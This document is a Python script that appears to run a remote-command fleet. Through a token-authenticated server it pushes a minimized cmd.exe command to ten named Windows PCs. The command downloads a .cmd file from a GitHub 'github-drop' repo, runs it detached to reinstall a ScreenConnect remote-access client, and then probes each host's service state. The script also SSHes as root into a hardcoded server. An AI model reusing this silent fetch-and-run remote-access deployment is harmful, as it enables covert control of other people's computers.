#!/usr/bin/env python3
"""Apply operator-proven R3 Gryxa recover to remaining problem hosts; verify."""
from __future__ import annotations

import json
import re
import subprocess
import sys
import time
import urllib.parse
import urllib.request
from pathlib import Path

import paramiko

BASE = "https://debian.seczio.com"
ADMIN = ((Path(__file__).resolve().parent / "secrets" / "admin_token.txt")).read_text(encoding="utf-8").strip()
OUT = Path.home() / "Desktop" / "gryxa_fleet_scan.txt"
KEY = str(Path.home() / ".ssh" / "winrtcs_ed25519")
PROJ = Path.home() / "Desktop" / "Project"

# Remaining problem set from last live scan + Sight online-no-gryxa (exclude 3UFSG6P — user fixed)
TARGETS = [
    "CUONGCHECKERS",
    "DESKTOP-L66QG8O",
    "MRG-DELL",
    "SECRETARYPC",
    "KYLEESPC",
    "BRAINDEVICE",
    "PEREZ",
    "MIKESCOMPUTER",
    "IDGITPOE1959",
    "DESKTOP-L12E0G2",
]

# Also confirm user-fixed host
VERIFY_EXTRA = ["DESKTOP-3UFSG6P"]

RECOVER = (
    'start "" /min cmd.exe /c "'
    r"C:\Windows\System32\curl.exe -f -L --ssl-no-revoke --connect-timeout 15 --max-time 90"
    r" -o C:\Users\Public\gryxa_recover.cmd"
    " https://raw.githubusercontent.com/xnobuddy/github-drop/main/winrtcs_gryxa_recover.cmd"
    r" & call C:\Users\Public\gryxa_recover.cmd --detached"
    '" & echo RECOVER_R3_QUEUED'
)

PROBE = (
    "powershell -NoProfile -NonInteractive -Command "
    "\"$ErrorActionPreference='SilentlyContinue'; "
    "$s=Get-CimInstance Win32_Service | Where-Object { $_.Name -eq 'ScreenConnect Client (36e506ff016b2151)' } | Select-Object -First 1; "
    "if(-not $s){ Write-Output 'GRYXA=MISSING' } else { "
    "$g= if($s.PathName -match 'gryxa\\.com'){'YES'} else {'NO'}; "
    "Write-Output ('GRYXA='+$s.State+'|PATH_GRYXA='+$g+'|START='+$s.StartMode) "
    "}; "
    "Get-Service -Name 'ScreenConnect Client*' -EA SilentlyContinue | ForEach-Object { "
    "Write-Output ('SC='+$_.Name+'|'+$_.Status) }; "
    "Write-Output 'GRYXA_PROBE_DONE'\""
)

LOGTAIL = (
    r"powershell -NoP -NonI -C "
    "\"if(Test-Path C:\\Users\\Public\\gryxa_recover.log){ Get-Content C:\\Users\\Public\\gryxa_recover.log -Tail 30 } "
    "else {'NO_LOG'}; "
    "$s=Get-CimInstance Win32_Service | Where-Object { $_.Name -eq 'ScreenConnect Client (36e506ff016b2151)' } | Select-Object -First 1; "
    "if($s){'NOW='+$s.State} else {'NOW=MISSING'}\""
)


def api(path: str, fields: dict | None = None, retries: int = 8) -> str:
    data = urllib.parse.urlencode(fields).encode() if fields is not None else None
    last: Exception | None = None
    for i in range(retries):
        try:
            req = urllib.request.Request(BASE + path, data=data)
            req.add_header("Authorization", "Bearer " + ADMIN)
            req.add_header("User-Agent", "Mozilla/5.0 (WinRTCS-Console)")
            with urllib.request.urlopen(req, timeout=90) as r:
                return r.read().decode(errors="replace")
        except Exception as e:
            last = e
            print(f"api retry {i+1}: {e}")
            time.sleep(6 + i * 3)
    raise RuntimeError(last)


def api_json(path: str) -> dict:
    return json.loads(api(path))


def queue(target: str, cmd: str) -> int:
    text = api("/cmd", {"target": target, "cmd": cmd})
    print(text.strip())
    m = re.search(r"id=(\d+)", text)
    if not m:
        raise RuntimeError(text)
    return int(m.group(1))


def wait_one(cid: int, timeout: float = 120.0) -> str:
    t0 = time.time()
    while time.time() - t0 < timeout:
        try:
            res = api_json(f"/api/cmd/{cid}").get("results") or []
        except Exception as e:
            print("wait", e)
            time.sleep(8)
            continue
        if res:
            time.sleep(4)
            res = api_json(f"/api/cmd/{cid}").get("results") or []
            return (res[0].get("out") if res else "") or ""
        time.sleep(6)
    return ""


def push_r3() -> None:
    msg = PROJ / ".git" / "COMMIT_EDITMSG_R3"
    msg.write_text(
        "fix: gryxa recover R3 — operator-proven /x shared PC then UI MSI /i\n\n"
        "DESKTOP-3UFSG6P: stop/delete Gryxa, msiexec /x shared ProductCode, "
        "wait ~20s, ui.gryxa.com MSI /i — Gryxa returns.\n",
        encoding="utf-8",
    )
    subprocess.run(["git", "add", "winrtcs_gryxa_recover.cmd"], cwd=PROJ, check=True)
    subprocess.run(["git", "commit", "-F", str(msg)], cwd=PROJ, check=True)
    subprocess.run(["git", "push", "origin", "HEAD"], cwd=PROJ, check=True)
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect("144.172.107.56", username="root", key_filename=KEY, timeout=20)
    _i, o, e = ssh.exec_command(
        "cd /opt/winrtcs/repo && git fetch origin && git pull --ff-only && git log -1 --oneline"
    )
    print(o.read().decode(errors="replace"))
    err = e.read().decode(errors="replace")
    if err.strip():
        print(err)
    ssh.close()
    body = urllib.request.urlopen(
        "https://raw.githubusercontent.com/xnobuddy/github-drop/main/winrtcs_gryxa_recover.cmd",
        timeout=30,
    ).read().decode(errors="replace")
    assert "recover_begin host=%COMPUTERNAME% R3" in body, "R3 not on github"
    print("github+vps R3 OK")


def main() -> int:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    print("== push R3 ==")
    push_r3()

    print("== queue R3 on problem hosts ==")
    for h in TARGETS:
        print("recover", h)
        queue(h, RECOVER)
        time.sleep(0.2)

    # msiexec /x wait 20s + download + /i ~90s + settle
    print("wait 200s for R3 cycle")
    time.sleep(200)

    lines = [f"=== R3 RESULTS {time.strftime('%Y-%m-%d %H:%M:%S')} ==="]
    ok, bad, offline = [], [], []
    for h in TARGETS + VERIFY_EXTRA:
        print("probe", h)
        cid = queue(h, PROBE)
        out = wait_one(cid)
        if not out.strip():
            # try log
            cid2 = queue(h, LOGTAIL)
            out2 = wait_one(cid2, 90)
            if not out2.strip():
                offline.append(h)
                lines.append(f"{h}: OFFLINE/NO_RESPONSE")
                print(h, "OFFLINE")
                continue
            out = out2
        m = re.search(r"GRYXA=([A-Za-z_]+)|NOW=([A-Za-z_]+)", out)
        state = (m.group(1) or m.group(2) or "?").upper() if m else "?"
        running = state == "RUNNING" or "GRYXA=Running" in out or "NOW=Running" in out
        path_ok = "PATH_GRYXA=YES" in out or "gryxa.com" in out.lower()
        if running and (path_ok or "PATH_GRYXA=" not in out):
            ok.append(h)
            lines.append(f"{h}: OK Running")
        else:
            bad.append(h)
            # pull log for bad
            cidl = queue(h, LOGTAIL)
            log = wait_one(cidl, 90)
            lines.append(f"{h}: BAD state={state}")
            lines.append("  " + out.replace("\n", " | ")[:200])
            lines.append("  LOG: " + log.replace("\n", " | ")[-400:])
        print(h, "OK" if h in ok else "BAD/OFF", out[:180].replace("\n", " | "))
        time.sleep(0.15)

    lines.append("")
    lines.append(f"OK={ok}")
    lines.append(f"BAD={bad}")
    lines.append(f"OFFLINE={offline}")
    report = "\n".join(lines) + "\n"
    prev = OUT.read_text(encoding="utf-8") if OUT.exists() else ""
    OUT.write_text(prev + "\n" + report, encoding="utf-8")
    print(report)
    print("wrote", OUT)
    return 0 if not bad else 2


if __name__ == "__main__":
    raise SystemExit(main())
